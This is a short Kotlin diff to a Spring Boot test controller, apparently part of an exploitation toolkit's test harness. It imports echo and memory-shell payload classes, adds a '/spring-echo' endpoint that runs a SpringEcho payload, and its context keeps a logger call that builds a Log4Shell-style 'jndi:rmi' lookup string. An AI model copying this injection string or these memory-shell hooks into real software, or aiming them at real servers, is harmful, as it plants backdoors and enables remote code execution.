@@ -1,5 +1,6 @@
 package springboot
 
+import http.payloads.echo.SpringEcho
 import http.payloads.echo.TomcatEcho
 import http.payloads.memshell.SpringShell
 import http.payloads.memshell.TomcatShell
@@ -22,6 +23,13 @@ class TestController {
         } else {
             logger.error(String.format("\${jndi:rmi://127.0.0.1:1099/%s}", index))
         }
+        return "200 OK"
+    }
+
+    @ResponseBody
+    @RequestMapping("/spring-echo")
+    fun springEcho(): String {
+        SpringEcho()
         return "200 OK"
     }
 
